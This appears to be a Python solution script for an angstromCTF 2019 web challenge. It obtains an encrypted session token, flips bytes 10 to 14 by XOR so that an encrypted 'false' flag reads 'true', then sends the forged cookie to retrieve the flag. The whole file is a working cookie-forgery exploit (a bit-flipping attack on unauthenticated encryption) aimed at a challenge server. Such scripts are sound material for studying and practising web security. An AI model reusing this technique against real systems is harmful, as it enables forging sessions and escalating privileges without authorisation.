#! /usr/bin/env python3

import requests
from base64 import b64encode, b64decode
import re
URL = "https://secretsheepsociety.2019.chall.actf.co/"

session = requests.Session()

# generate token from /enter route 
token = None
enter_data = {"handle": "xx"}
print("[+] Sending 'xx' as handle payload!")
token_exp = re.compile(r'token=(.*);')
req = session.post(URL+"enter", data=enter_data, verify=False, allow_redirects=False)
print("[?] Made request to /enter")
if req.status_code == 302:
    print("[?] Got 302 Redirect request")
    match = re.search(token_exp, req.headers["Set-Cookie"])
    if match:
        token = match.group(1)
        print("[+] Got token : ", token)

if token is not None:
    ct = b64decode(token)
    manipulated_token = list(ct)
    manipulated_token[10] = manipulated_token[10] ^ ord('f') ^ ord('t')
    manipulated_token[11] = manipulated_token[11] ^ ord('a') ^ ord('r')
    manipulated_token[12] = manipulated_token[12] ^ ord('l') ^ ord('u')
    manipulated_token[13] = manipulated_token[13] ^ ord('s') ^ ord('e')
    manipulated_token[14] = manipulated_token[14] ^ ord('e') ^ ord(' ')
    print("[+] Flipped Bytes 10, 11, 12, 13 and 14")

    final_token = b64encode(bytes(manipulated_token))

    print("[+] generated new token ", final_token.decode())


if final_token is not None:
    session = requests.Session()
    cookies = {"token": final_token.decode()}
    flag_exp = re.compile(r'actf{.*}')
    req = session.get(URL, cookies=cookies)
    if req.status_code == 200:
        m = re.search(flag_exp, req.text)
        if m:
            print("[+] FLAG: ", m.group(0))










